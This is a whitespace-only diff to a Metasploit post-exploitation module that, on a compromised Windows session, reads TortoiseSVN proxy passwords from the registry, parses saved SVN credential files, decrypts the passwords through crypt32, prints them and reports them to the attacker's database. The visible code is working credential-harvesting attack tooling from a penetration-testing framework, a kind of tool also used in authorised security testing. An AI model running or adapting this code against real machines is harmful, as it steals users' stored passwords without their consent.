@@ -25,7 +25,7 @@ class Metasploit3 < Msf::Post
 				'SessionTypes'  => [ 'meterpreter' ]
 			))
 	end
-	
+
 	def prepare_railgun
 		rg = session.railgun
 		if (!rg.get_dll('crypt32'))
@@ -63,7 +63,7 @@ class Metasploit3 < Msf::Post
 		# Check if user proxy setting are utilized
 		@key_base = "HKCU\\Software\\TortoiseSVN\\Servers\\global\\"
 		http_proxy_password = registry_getvaldata("#{@key_base}", 'http-proxy-password')
-		
+
 		if http_proxy_password == nil
 			return
 		else
@@ -72,7 +72,7 @@ class Metasploit3 < Msf::Post
 			http_proxy_username= registry_getvaldata("#{@key_base}", 'http-proxy-username')
 			http_proxy_host = registry_getvaldata("#{@key_base}", 'http-proxy-host')
 			http_proxy_port = registry_getvaldata("#{@key_base}", 'http-proxy-port')
-			
+
 			# Output results to screen
 			print_status("     Host: #{http_proxy_host}")
 			print_status("     Port: #{http_proxy_port}")
@@ -80,7 +80,7 @@ class Metasploit3 < Msf::Post
 			print_status("     Password: #{http_proxy_password}")
 			print_status("")
 		end
-		
+
 		# Report proxy creds
 		if session.db_record
 			source_id = session.db_record.id
@@ -95,8 +95,8 @@ class Metasploit3 < Msf::Post
 		:source_type => "exploit",
 		:user => http_proxy_username,
 		:pass => http_proxy_password)
-	end		
-	
+	end
+
 	def get_config_files
 		# Determine if TortoiseSVN is installed and parse config files
 		savedpwds = 0
@@ -111,21 +111,21 @@ class Metasploit3 < Msf::Post
 			end
 		rescue => e
 			print_error "Exception raised: #{e.message}"
-			print_status("No configuration files located: TortoiseSVN may not be installed or configured.") 
+			print_status("No configuration files located: TortoiseSVN may not be installed or configured.")
 			return
 		end
-	
+
 		if savedpwds == 0
 			print_status("No configuration files located")
 		end
-			
+
 	end
-	
+
 	def analyze_file(filename)
 		config = client.fs.file.new(filename, 'r')
 		contents = config.read
 		config_lines = contents.split("\n")
-		
+
 		print_good("Account Found:")
 		line_num = 0
 
@@ -147,9 +147,9 @@ class Metasploit3 < Msf::Post
 						host = $2
 						portnum = $3
 						portnum.gsub! "\r", ""   #Remove \r (not common)
-					end			
+					end
 				else
-					url = "<Unknown/Error>"				
+					url = "<Unknown/Error>"
 				end
 			elsif line_num == 16
 				user_name = line
@@ -157,19 +157,19 @@ class Metasploit3 < Msf::Post
 			end
 		end
 		config.close
-		
+
 		#Handle null values or errors
 		if user_name == nil
 			user_name = "<Unknown/Error>"
 		end
-		
+
 		# Output results to screen
 		print_status("     URL: #{url}")
 		print_status("     Realm: #{realm}")
 		print_status("     User Name: #{user_name}")
 		print_status("     Password: #{password}")
 		print_status("")
-		
+
 		# Report
 		if session.db_record
 			source_id = session.db_record.id
@@ -185,14 +185,14 @@ class Metasploit3 < Msf::Post
 		:user => user_name,
 		:pass => password)
 		print_debug "Should have reported..."
-		
+
 		# Set savedpwds to 1 on return
-		return 1 
+		return 1
 	end
-	
+
 	def run
 		# Get uid.  Decryption will only work if executed under the same user account as the password was encrypted.
-		uid = session.sys.config.getuid     
+		uid = session.sys.config.getuid
 
 		if is_system?
 			print_error("This module is running under #{uid}.")
@@ -207,5 +207,5 @@ class Metasploit3 < Msf::Post
 
 		print_status("Complete")
 	end
-	
+
 end
